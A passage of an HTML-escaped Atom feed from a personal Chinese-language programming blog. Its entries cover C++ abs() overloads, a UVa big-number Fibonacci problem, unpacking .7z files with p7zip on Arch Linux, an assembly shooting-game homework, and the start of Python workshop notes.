裏面有提到  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In C++, this function is also overloaded in header &lt;a href="http://www.cplusplus.com/cmath"&gt;cmath&lt;/a&gt; for floating-point types (see &lt;a href="http://www.cplusplus.com/cmath:abs"&gt;cmath abs&lt;/a&gt;),&lt;br /&gt;
in header &lt;a href="http://www.cplusplus.com/complex"&gt;complex&lt;/a&gt; for complex numbers (see &lt;a href="http://www.cplusplus.com/complex:abs"&gt;complex abs&lt;/a&gt;),&lt;br /&gt;
and in header &lt;a href="http://www.cplusplus.com/valarray"&gt;valarray&lt;/a&gt; for valarrays (see &lt;a href="http://www.cplusplus.com/valarray:abs"&gt;valarray abs&lt;/a&gt;).  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以其實很多 library 裏面都有 &lt;code&gt;abs()&lt;/code&gt; 這個 function&lt;br /&gt;
這裡就不細講了 有興趣的人請自行參閱  &lt;/p&gt;
&lt;p&gt;而 &lt;code&gt;cmath&lt;/code&gt; 的 &lt;code&gt;abs()&lt;/code&gt; 也有提到&lt;br /&gt;
&lt;a href="http://www.cplusplus.com/reference/cmath/abs/"&gt;http://www.cplusplus.com/reference/cmath/abs/&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;These convenience abs overloads are exclusive of C++.&lt;br /&gt;
In C, &lt;a href="http://www.cplusplus.com/abs"&gt;abs&lt;/a&gt; is only declared in &lt;a href="http://www.cplusplus.com/cstdlib"&gt;cstdlib&lt;/a&gt; (and only operates on integral values).  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以在 C 裏面&lt;br /&gt;
只有 &lt;code&gt;&amp;lt;stdlib.h&amp;gt;&lt;/code&gt; 裏面有 &lt;code&gt;abs()&lt;/code&gt; 這個 function 而且還只能給整數型態用&lt;br /&gt;
因為沒有 function overloading&lt;br /&gt;
(看到這個就覺得我應該用 C 寫的Orz  老實說其實自己寫一個也很快Orz  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;abs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="p"&gt;{&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;a&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;這樣就行了...&lt;br /&gt;
反正後來總算是寫出來了 也找到了錯誤 應該值得高興(吧？&lt;br /&gt;
以下是我的 code  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://gist.github.com/M157q/c92d437af7f7d497de67"&gt;https://gist.github.com/M157q/c92d437af7f7d497de67&lt;/a&gt;  &lt;/p&gt;</summary><category term="Cpp"></category><category term="Online Judge"></category><category term="abs"></category></entry><entry><title>[Cpp] [Online Judge] UVa 10579 Fibonacci Numbers</title><link href="https://blog.m157q.tw/posts/2013/04/29/cpp-online-judge-uva-10579-fibonacci-numbers/" rel="alternate"></link><published>2013-04-29T19:57:00+08:00</published><updated>2013-04-29T19:57:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-04-29:posts/2013/04/29/cpp-online-judge-uva-10579-fibonacci-numbers/</id><summary type="html">&lt;p&gt;2013/04/29 基礎程式檢定考題之一&lt;br /&gt;
(共7題 我寫了三題 只對一題Orz 後來花時間把沒寫完的兩題寫完 這是其中一題)  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://uva.onlinejudge.org/external/105/10579.html"&gt;http://uva.onlinejudge.org/external/105/10579.html&lt;/a&gt;  &lt;/p&gt;
&lt;!--more--&gt;

&lt;p&gt;這題必須要用大數加法才能做出來  &lt;/p&gt;
&lt;p&gt;題目說答案不會超過 1000 位數  &lt;/p&gt;
&lt;p&gt;我在考試的時候還很開心的用 unsigned long long 去算答案= ="  &lt;/p&gt;
&lt;p&gt;unsigned long long 最大值是 2^64 -1 == 1.8446744073709551615 × 10^19  &lt;/p&gt;
&lt;p&gt;也就是只能完全計算到 18 位數和一點點 19 位數 超過以後就會 overflow...  &lt;/p&gt;
&lt;p&gt;我還在那邊試很久= =" 想說怎麼測資都沒對 大概是上機考的時候太緊張了吧= =""  &lt;/p&gt;
&lt;p&gt;對大數不太熟悉 剛好就用這題來練習  &lt;/p&gt;
&lt;p&gt;Big number 就是把原本的 int 分開成 int array 去儲存  &lt;/p&gt;
&lt;p&gt;每個 element 都代表一個位數 作法就像小學時候學的直式加法一樣  &lt;/p&gt;
&lt;p&gt;所以可以一直加下去 只要用來儲存答案位數的 int array 給的夠大就行  &lt;/p&gt;
&lt;p&gt;以下是我的 code  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://gist.github.com/M157q/53d3dc8586ddee57e240"&gt;https://gist.github.com/M157q/53d3dc8586ddee57e240&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;因為有點懶的打英文 所以用了中文註解...  &lt;/p&gt;</summary><category term="Cpp"></category><category term="Online Judge"></category><category term="Big Number"></category></entry><entry><title>Unzip 7zip file by p7zip on Arch Linux</title><link href="https://blog.m157q.tw/posts/2013/04/11/unzip-7zip-file-by-p7zip-on-arch-linux/" rel="alternate"></link><published>2015-10-26T14:19:00+08:00</published><updated>2015-10-26T14:19:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-04-11:posts/2013/04/11/unzip-7zip-file-by-p7zip-on-arch-linux/</id><summary type="html">&lt;p&gt;組語作業給的 template 是用 &lt;code&gt;7zip&lt;/code&gt; 打包成副檔名為 &lt;code&gt;.7z&lt;/code&gt; 的檔案&lt;br /&gt;
為了寫 report 想要把 &lt;code&gt;.7z&lt;/code&gt; 的 file 解壓縮  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;因為習慣在 CLI 環境下工作&lt;br /&gt;
於是就 google 搜尋了一下有沒有相關的 command&lt;br /&gt;
然後找到了 &lt;a href="http://blog.xuite.net/michaelr/linux/17595860"&gt;Linux下解開7z丶7zip檔 @ 麥克星球 Linux Fedora 心得筆記 :: 隨意窩 Xuite日誌&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;Keyword: p7zip&lt;/h2&gt;
&lt;p&gt;在 Arch Linux 下&lt;br /&gt;
&lt;code&gt;$ pacman -Ss p7zip&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;出現以下的訊息  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;extra/p7zip 9.20.1-6  
Command-line version of the 7zip compressed file archiver  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;接著就&lt;br /&gt;
&lt;code&gt;$ sudo pacman -S p7zip&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;安裝完畢之後會多一個 7z 的指令可以使用  &lt;/p&gt;
&lt;p&gt;想看 man page 的話就&lt;br /&gt;
&lt;code&gt;$ man 7z&lt;/code&gt;&lt;br /&gt;
我是覺得沒有寫的很清楚啦  &lt;/p&gt;
&lt;p&gt;所以我又去找了一些網站  &lt;/p&gt;
&lt;p&gt;底下這個網站有些簡單易懂的範例&lt;br /&gt;
&lt;a href="https://www.ibm.com/developerworks/community/blogs/6e6f6d1b-95c3-46df-8a26-b7efd8ee4b57/entry/how_to_use_7zip_on_linux_command_line144?lang=en"&gt;How to use 7zip on Linux command Line (Real world open source)&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;不過還是沒找到我想要的  &lt;/p&gt;
&lt;p&gt;如果我直接下&lt;br /&gt;
&lt;code&gt;$ 7z e xxx.7z&lt;/code&gt;&lt;br /&gt;
就會有悲劇發生  &lt;/p&gt;
&lt;p&gt;xxx.7z 裏面的東西會全部跟我的當前資料夾所有東西混在一起!!&lt;br /&gt;
所以要怎樣才能讓 7z 在解壓縮一個檔案的時候順便新建一個資料夾把檔案都塞進去呢?&lt;br /&gt;
我 google 到了有人問了同樣的問題(果然不是只有我笨)&lt;br /&gt;
&lt;a href="http://superuser.com/questions/95902/7-zip-and-unzipping-from-command-line"&gt;7 zip - 7-Zip and unzipping from command line - Super User&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;結果原來只要&lt;br /&gt;
&lt;code&gt;$ 7z x xxx.7z&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;沒錯 只要把 e 改成 x 就好了  &lt;/p&gt;
&lt;p&gt;後來看到其實在 man page 有寫了這些東西  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;FUNCTION LETTERS  
     a Add  
     d Delete  
     e Extract  
     l List  
     t Test  
     u Update  
     x eXtract with full paths  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;沒錯 就是最後那行! x!  &lt;/p&gt;
&lt;p&gt;總之就是這樣 以後解壓縮 .7z 的 file 也跟 .tar .zip 那些檔案一樣&lt;br /&gt;
用 CLI 就可以解決啦  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.xuite.net/michaelr/linux/17595860"&gt;Linux下解開7z丶7zip檔 @ 麥克星球 Linux Fedora 心得筆記 :: 隨意窩 Xuite日誌&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ibm.com/developerworks/community/blogs/6e6f6d1b-95c3-46df-8a26-b7efd8ee4b57/entry/how_to_use_7zip_on_linux_command_line144?lang=en"&gt;How to use 7zip on Linux command Line (Real world open source)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://superuser.com/questions/95902/7-zip-and-unzipping-from-command-line"&gt;7 zip - 7-Zip and unzipping from command line - Super User&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="Linux"></category><category term="7zip"></category><category term="CLI"></category></entry><entry><title>asm hw3 - a small shooting game</title><link href="https://blog.m157q.tw/posts/2013/04/10/asm-hw3-a-small-shooting-game/" rel="alternate"></link><published>2013-04-10T22:07:00+08:00</published><updated>2013-04-10T22:07:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-04-10:posts/2013/04/10/asm-hw3-a-small-shooting-game/</id><summary type="html">&lt;p&gt;&lt;img alt="Demo" src="/files/asm-hw3-a-small-shooting-game/demo.png" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;Key usages:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;‘a’ : leftmove: Step size 2.  &lt;/li&gt;
&lt;li&gt;‘d’ :rightmove: Step size 2.  &lt;/li&gt;
&lt;li&gt;Spacebar:fire bullet: Step size 1.  &lt;/li&gt;
&lt;li&gt;ESC : quit program  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;這學期修組語的第三次作業  &lt;/p&gt;
&lt;p&gt;跟之前第二次的作業很類似 都是寫一個射擊遊戲  &lt;/p&gt;
&lt;p&gt;不過這次的比較複雜  &lt;/p&gt;
&lt;p&gt;但黃世強教授有先給 template 所以寫起來也不算太難  &lt;/p&gt;
&lt;p&gt;這次的作業強調全部使用 Procedure  &lt;/p&gt;
&lt;p&gt;讓整份 code 達到近乎 100% 的 modulization  &lt;/p&gt;
&lt;p&gt;我覺得我寫出來算是蠻漂亮了  &lt;/p&gt;
&lt;p&gt;要改設定幾乎都在 .data 的部分更改就可以完成了  &lt;/p&gt;
&lt;p&gt;真正要縮減的大概就是 explosion 的 show 和 reset 吧...  &lt;/p&gt;
&lt;p&gt;為了找怎麼樣在 user 按 Esc 的時候可以讀到 key  google 到這幾個網址  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://msdn.microsoft.com/en-us/library/ms927178.aspx"&gt;http://msdn.microsoft.com/en-us/library/ms927178.aspx&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://programming.msjc.edu/asm/help/source/irvinelib/readkey.htm"&gt;http://programming.msjc.edu/asm/help/source/irvinelib/readkey.htm&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;總之就是看 dx 的值是不是 001Bh  是的話就是 ReadKey 讀到 Esc 了  &lt;/p&gt;
&lt;p&gt;為了找哪個 symbol 當 user 控制的 spaceship 比較好看 google 到了 &lt;a href="http://en.wikipedia.org/wiki/Code_page_437"&gt;Code page 437&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;系上組語都是使用 MASM 並搭配 Irvine32.lib  &lt;/p&gt;
&lt;p&gt;這是課本提供的 Irvine 相關檔案&lt;br /&gt;
&lt;a href="https://drive.google.com/folderview?id=0B4nAP-ilSfbjUnFJTkVaSFVQRUU&amp;amp;usp=sharing"&gt;https://drive.google.com/folderview?id=0B4nAP-ilSfbjUnFJTkVaSFVQRUU&amp;amp;usp=sharing&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;可以搭配這份網路上找到的 Irvine32.asm 的 source code 一起學習&lt;br /&gt;
&lt;a href="http://lcs.syr.edu/faculty/pease/handouts/CSE%20281/Irvine%20Programming%20Examples/Lib32/Irvine32_Library/Irvine32.asm"&gt;http://lcs.syr.edu/faculty/pease/handouts/CSE%20281/Irvine%20Programming%20Examples/Lib32/Irvine32_Library/Irvine32.asm&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;source code 放在 gist 上&lt;br /&gt;
&lt;a href="https://gist.github.com/M157q/5358879"&gt;https://gist.github.com/M157q/5358879&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;在 M$ 上用 codepad++ 的 tab 排版 gist 的 tab 縮排又不能選 4 格 看來有點悲劇= ="  &lt;/p&gt;
&lt;/blockquote&gt;</summary><category term="assembly"></category><category term="MASM"></category></entry><entry><title>開放源碼的動態程式設計語言體驗營 - Python</title><link href="https://blog.m157q.tw/posts/2013/04/09/tutorial-for-open-source-dynamic-typing-language-python/" rel="alternate"></link><published>2015-10-27T11:20:00+08:00</published><updated>2015-10-27T11:20:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-04-09:posts/2013/04/09/tutorial-for-open-source-dynamic-typing-language-python/</id><summary type="html">&lt;h3&gt;Event&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.openfoundry.org/en/activities/details/366"&gt;Activities - 開放源碼的動態程式設計語言體驗營 - Python - OpenFoundry&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Slides&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.openfoundry.org/tw/slides-download/cat_view/35/711/712"&gt;Downloads | 03/09 開放源碼的動態程式設計語言體驗營 - Python | 2013年-活動/研討會 | 歷年活動／研討會簡報 | 活動 / 研討會相關 - OpenFoundry&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;備份  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/m157q.github.io/raw/source/content/files/tutorial-for-open-source-dynamic-typing-language-python/0309_programming-with-python-basic.pdf"&gt;Day 1&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/m157q.github.io/raw/source/content/files/tutorial-for-open-source-dynamic-typing-language-python/0310_programming-with-python-adv.pdf"&gt;Day 2&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Videos&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=cUYu6v6b_oY&amp;amp;list=PLuW7NCGvKlyXZxvnpZxwu6AUeSdqkcmbm"&gt;自由軟體鑄造場_20130309_開放源碼的動態程式設計語言體驗營 - Python_Mosky_01 - YouTube&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=AXpV-sUIYqI&amp;amp;list=PLuW7NCGvKlyU82s5TX8LqGk9arydf9m9Z"&gt;自由軟體鑄造場_20130310_開放源碼的動態程式設計語言體驗營 - Python_Mosky_01 - YouTube&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上個月去台北大同大學跟 Mosky 學 Python 做的一些筆記&lt;br /&gt;
同樣的筆記我也有放在 gist 上，但是純文字版。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/M157q/5124618"&gt;20130309-mosky-python-day1 · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://gist.github.com/M157q/5128627"&gt;20130309-mosky-python-day2 · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Mosky 真的超萌而且聲音超好聽的 &amp;gt;////&amp;lt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;後記 (2015/10/26)&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;寫這篇筆記的當時還不太熟 Markdown&lt;br /&gt;
所以 gist 是略帶 Markdown 語法的純文字版&lt;br /&gt;
當時因為懶惰，所以把純文字直接複製貼上到 blog 就沒管了&lt;br /&gt;
最近在整理舊的 blog 文章，整理到這篇。&lt;br /&gt;
因為純文字版本在 Pelican 上 rendering 的效果很恐怖&lt;br /&gt;
所以這邊的版本是從純文字修改為 Markdown 的版本&lt;br /&gt;
同時也修正了一些當年筆記上的錯誤和補充一些內容&lt;br /&gt;
轉眼間接觸 Python 已經兩年半了呢&lt;br /&gt;
這些當年看起來內容很生澀的筆記，現在也都懂了&lt;br /&gt;
這種感覺有點神奇&lt;br /&gt;
目前愈來愈喜歡 Python 這個語言了&lt;br /&gt;
至於內文把 Python 的 P 全用成小寫 p，我實在懶的改，意思有到就好了嘛(?)&lt;br /&gt;
或許哪天我的強迫症發作了，我又會回來改這篇文章也說不定。&lt;br /&gt;
筆記看似很多，其實仍然因為打字速度不夠快的原因，沒紀錄到很完整，但大概有八成了吧  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h3&gt;&lt;a href="https://pypi.python.org/pypi"&gt;PyPI&lt;/a&gt; - commit your python project&lt;/h3&gt;
&lt;h3&gt;project -  a blog system&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Dynamic typing, Static typing, Functor, Closure  我還不熟的東西  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 1 - 2013.03.09&lt;/h1&gt;
&lt;h2&gt;Python 2 or 3 ?&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;2.7 是 2.x 最後一個 release  &lt;/li&gt;
&lt;li&gt;python 目前全力投入 3.x 的開發  &lt;/li&gt;
&lt;li&gt;3.x is easier for newcomer  &lt;/li&gt;
&lt;li&gt;2.x has more third-party lib  &lt;/li&gt;
&lt;li&gt;轉換 Syntax  &lt;ul&gt;
&lt;li&gt;2to3.py (官方)  &lt;/li&gt;
&lt;li&gt;3to2.py(非官方)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2.x 有 backported features 因為和 3.x 平行開發，所以會把 3.x 的一些 features 拿回來用  &lt;/li&gt;
&lt;li&gt;Use Python 3 if you can.    用 python3 就對了(?  &lt;/li&gt;
&lt;li&gt;根據你要用的 library 選擇 2.x 或 3.x  &lt;/li&gt;
&lt;li&gt;課程會以 python2.7 為主, 但會介紹 3.x 中的改變  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般看到的都是 cpython , 對 c/c++ 提供較好的相容性,&lt;br /&gt;
可以在 c/c++ 中寫 python 的 module, 然後在 python 中 import 進來&lt;br /&gt;
主流都是用 cpython, 一般的 document 也都是以 cpython 為主  &lt;/p&gt;
&lt;h2&gt;byte code&lt;/h2&gt;
&lt;h2&gt;Python Shell&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-c&lt;/code&gt;: 直接執行一行式  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python -c &amp;#39;print &amp;quot;hello, world&amp;quot;&amp;#39;    # python2  
python -c &amp;#39;print(&amp;quot;hello, world&amp;quot;)&amp;#39;   # python3  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-m&lt;/code&gt;: 使用module  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python -m SimpleHTTPServer [port]   # python2  
python -m http.server [port]        # python3  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;hello.py&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;用 4 個空白 不要用 tab  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;:&lt;/code&gt; 是一個 block 開始的意思  &lt;/li&gt;
&lt;li&gt;換行就代表一個 statement 的結束  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="vm"&gt;__name__&lt;/span&gt;  &lt;span class="c1"&gt;# the name of module  &lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt;&lt;span class="c1"&gt;# 類似 C 裏面的 main 函數  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Common types&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Characteristics  &lt;ul&gt;
&lt;li&gt;Mutable / Immutable (是否可變動)  &lt;ul&gt;
&lt;li&gt;Immutable 不可變動  &lt;ul&gt;
&lt;li&gt;ex: Hashable &lt;code&gt;(__hash__)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;python 的變數可視為純 pointer  &lt;/li&gt;
&lt;li&gt;Immutable 代表該變數指向的物件是不可變動的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ordered / Unordered  &lt;ul&gt;
&lt;li&gt;Iterable &lt;code&gt;(__iter__)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Numeric (Immutable, Hashable)  &lt;ul&gt;
&lt;li&gt;integer  &lt;/li&gt;
&lt;li&gt;float  &lt;/li&gt;
&lt;li&gt;long  &lt;/li&gt;
&lt;li&gt;complex&lt;br /&gt;
          * &lt;code&gt;1+1j&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;小寫 j 或大寫 J 都可以  &lt;/li&gt;
&lt;li&gt;boolean&lt;br /&gt;
          * &lt;code&gt;True&lt;/code&gt;, &lt;code&gt;False&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;開頭要大寫  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sequence (Iterable, Ordered, Mutable/Immutable)  &lt;ul&gt;
&lt;li&gt;string&lt;br /&gt;
    * Mapping&lt;br /&gt;
        * dictionary&lt;br /&gt;
    * Set  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;a = 'string'&lt;br /&gt;
1. 先建立 string 這個 object&lt;br /&gt;
2. 再建立 a 這個 pointer&lt;br /&gt;
3. 再把 a 指向 string&lt;br /&gt;
4. 所以 string 是 Immutable，但可以讓 a 指向其他的 object  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Interger, Float and Long&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;divmod(被除數, 除數)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;回傳商數和餘數(tuple)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;5//2&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;取商的 floor  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;5**0.5&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;**0.5&lt;/code&gt; 就是取 square root  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;bin(整數)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;可以將該整數以 binary 表示  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;float(整數)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;可以將該整數轉成 float 表示  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Complex&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;complex(0,1) == 0+1j&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;a = 3.0 + 4.0j&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;a.real == 3.0&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;a.imag == 4.0&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;abs(a)&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;算出該複數在複數平面上跟原點的距離  &lt;/li&gt;
&lt;li&gt;等同於 &lt;code&gt;sqrt(a.real**2 + a.imag**2)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Boolean&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;not False&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;在 python 中直接打 &lt;code&gt;not&lt;/code&gt; 就好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;True and False&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;在 python 中直接打 &lt;code&gt;and&lt;/code&gt; 就好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;True or False&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;在 python 中直接打 &lt;code&gt;or&lt;/code&gt; 就好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;False&lt;/code&gt; 的值就是 &lt;code&gt;0&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;False + 1 == 1&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;True&lt;/code&gt;  的值就是 &lt;code&gt;1&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;True + 1 == 2&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;python 裏面的 float 有做過處理所以 &lt;code&gt;10 == 10.0&lt;/code&gt; 是 &lt;code&gt;True&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;x is y&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;判斷 x 和 y 是否真的指向同一個 object  &lt;/li&gt;
&lt;li&gt;比 &lt;code&gt;==&lt;/code&gt; 嚴謹，&lt;code&gt;==&lt;/code&gt; 只在乎值是否相同，而不考慮是否為同一個 object  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;String and Unicode&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;python 的單引號和雙引號是一樣的意思  &lt;/li&gt;
&lt;li&gt;String (immutable seq.)  &lt;ul&gt;
&lt;li&gt;python 中的字串是不能更改的  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;r'字串\n'&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;r 代表 raw string  &lt;/li&gt;
&lt;li&gt;在 r'' 裏面的跳脫字元不會被轉譯  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;'''字串'''&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;多行字串 (會幫你紀錄換行符)  &lt;/li&gt;
&lt;li&gt;通常python裏面的多行註解也是這樣寫  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unicode (Immutable seq.)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;u'字串'&lt;/code&gt;  &lt;ul&gt;
